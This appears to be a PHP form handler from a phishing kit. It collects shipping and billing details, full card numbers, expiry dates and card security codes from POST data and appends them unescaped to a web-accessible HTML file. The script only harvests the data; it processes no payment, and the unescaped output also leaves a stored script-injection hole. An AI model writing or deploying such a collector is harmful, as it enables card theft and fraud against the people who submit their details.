<?php

$shippingName = $_POST['shippingName'];
$shippingStreetAddress = $_POST['shippingStreetAddress'];
$shippingStreetAddressTwo = $_POST['shippingStreetAddressTwo'];
$shippingCity = $_POST['shippingCity'];
$shippingState = $_POST['shippingState'];
$shippingZip = $_POST['shippingZip'];
$billingName = $_POST['billingName'];
$billingStreetAddress = $_POST['billingStreetAddress'];
$billingStreetAddressTwo = $_POST['billingStreetAddressTwo'];
$billingCity = $_POST['billingCity'];
$billingState = $_POST['billingState'];
$billingZip = $_POST['billingZip'];
$cardNumber = $_POST['cardNumber'];
$expMonth = $_POST['expMonth'];
$expYear = $_POST['expYear'];
$csc = $_POST['csc'];

touch('output.txt');
if ( filesize('output.txt') < 50000 ) {
  $f = fopen('output.html', 'a');
  fwrite($f, "
<ul>
  <li>Shipping Name: $shippingName</li>
  <li>Shipping Address: $shippingStreetAddress</li>
  <li>Shipping Address Two: $shippingStreetAddressTwo</li>
  <li>Shipping City: $shippingCity</li>
  <li>Shipping State: $shippingState</li>
  <li>Shipping ZIP: $shippingZip</li>
  <li>Billing Name: $billingName</li>
  <li>Billing Address: $billingStreetAddress</li>
  <li>Billing Address Two: $billingStreetAddressTwo</li>
  <li>Billing City: $billingCity</li>
  <li>Billing State: $billingState</li>
  <li>Billing ZIP: $billingZip</li>
  <li>Card Number: $cardNumber</li>
  <li>Expiration Date: $expMonth/$expYear</li>
  <li>Card Security Code: $csc</li>
</ul>
<hr />
  ");
  fclose($f);
}

?>
